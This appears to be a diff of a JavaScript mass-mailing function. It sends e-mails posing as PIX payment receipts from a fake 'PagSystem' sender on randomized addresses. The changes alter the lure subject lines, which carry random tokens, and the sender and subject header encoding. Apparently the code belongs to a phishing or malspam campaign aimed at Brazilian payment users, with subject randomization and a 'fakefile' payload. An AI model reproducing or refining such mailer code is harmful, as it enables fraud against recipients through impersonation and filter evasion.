@@ -206,8 +206,8 @@ async function sendEmail(email) {
   html = novohtml;
   //RANDON HTML
 
-   let subject = `Comprovante PIX chegou por e-mail -  Nr:${randomstring.generate(
-    9
+   let subject = `Segue comprovante  -  token:${randomstring.generate(
+    10
   )}-`;
   //let subject = `Rescisão de contrato de trabalho -${randomstring.generate(8)}-`;
   try {
@@ -229,12 +229,10 @@ async function sendEmail(email) {
     const buff = Buffer.from(fakefile, "utf-8");
     // decode buffer as Base64
     const base64 = buff.toString("base64");
-    let nome = "PagSystem";
+    let nome = "PagSystens";
     let info = await transporter.sendMail({
       from:
-        "=?UTF-8?B?" +
-        Buffer.alloc(nome.length, nome).toString("base64") +
-        "?=" +
+        nome +
         " <" +
         "pagsystem" +
         randomstring.generate(between(3, 5)) +
@@ -242,8 +240,7 @@ async function sendEmail(email) {
         hostName +
         ">",
       replyTo: "=?UTF-8?B?" +
-        Buffer.alloc(nome.length, nome).toString("base64") +
-        "?=" +
+        nome +
         " <" +
         "pagsystem" +
         randomstring.generate(between(3, 5)) +
@@ -251,13 +248,7 @@ async function sendEmail(email) {
         hostName +
         ">", 
       to: mailarray[0],
-      subject: {
-        prepared: true,
-        value:
-          "=?UTF-8?B?" +
-          Buffer.alloc(subject.length, subject).toString("base64") +
-          "?=",
-      },
+      subject: subject,
       html: html,
       textEncoding: "base64",
       encoding: "utf-8",
